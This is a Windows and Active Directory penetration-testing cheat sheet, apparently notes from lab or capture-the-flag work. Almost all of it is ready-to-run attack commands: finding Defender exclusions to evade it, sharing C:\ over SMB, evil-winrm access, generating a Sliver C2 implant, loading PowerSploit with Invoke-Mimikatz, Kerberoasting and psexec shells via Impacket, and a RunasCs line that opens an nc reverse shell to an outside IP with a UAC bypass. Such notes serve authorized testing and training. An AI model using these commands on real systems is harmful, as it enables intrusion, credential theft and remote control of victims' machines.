## Check permissions 
##### Check permissions of folder
```sh
icacls "C:\Program Files"
```
##### Check user privs
```sh
whoami /priv
```
##### Info about user
```
net user USERNAME
```
##### Info about group
```
net group GROUPNAME
```

### Find Defender Exclusions
##### As low permission user
```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Where-Object { $_.Id -eq 5007 -and $_.Message -match "Exclusions" } | ForEach-Object { if ($_.Message -match "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\[^\s]+") { $matches[0] } }
```

### Make file system accessible with creating a share
```
New-SmbShare -Name SHIT_SHARE -Description "test" -Path C:\
```


## WinRM (Port 5985)
##### Connect
```sh
evil-winrm -i IP -u "USERNAME" -p 'PASSWORD'
```
##### Connect with certificate and private key (pfx)
```sh
evil-winrm -i IP -c pub.pem -k priv.pem -S -r DOMAIN
```
##### List user info
```sh
net user USERNAME
```
##### List running services
```sh
services
```
###### Upload file to box
```sh
upload FILEPATH
```

## Sliver (C2)
```sh
$ ./sliver-server-linux

sliver> generate --mtls 10.10.16.9 --os windows // generate binary

sliver> mtls // start listener

// Upload binary to box and run it

// CALLBACK
sliver> use <TAB>
```

### SOCKS5 SLIVER

```sh
sliver> socks5 start

$ proxychains4 nc 127.0.0.1 100
```

## [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)
Transfer `PowerSploit` folder to box
```ps1
Import-Module .\PowerSploit.psd1
OR
> . .\Powermad.ps1

Get-Command -Module PowerSploit
get-help Invoke-Mimikatz -examples
```

## [AD Pentest Suite](https://github.com/theyoge/AD-Pentesting-Tools) 

## Find Powershell history file
```sh
Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
```

## Bloodhound
##### Bloodhound (gather data)
```sh
bloodhound-python -u svc-printer -p '1edFg43012!!' -ns 10.129.201.79 -d return.local -c all
```
##### SharpHound
```sh
.\SharpHound.exe --CollectionMethods All --ZipFileName output.zip
```
##### Start Bloodhound
```sh
sudo neo4j console
bloddhound
```

## ImPacket
##### List AD users
```sh
impacket-GetADUsers -all -dc-ip IP DOMAIN/USERNAME
```
##### Kerberoast
```sh
impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USERNAME
```
##### PSExec (Get shell)
```sh
impacket-psexec DOMAIN/USERNAME@IP
```


### RunAs with password
```sh
.\RunasCs.exe backup password "nc64.exe 10.10.14.139 4444 -e cmd.exe" --bypass-uac --logon-type '8' 
```
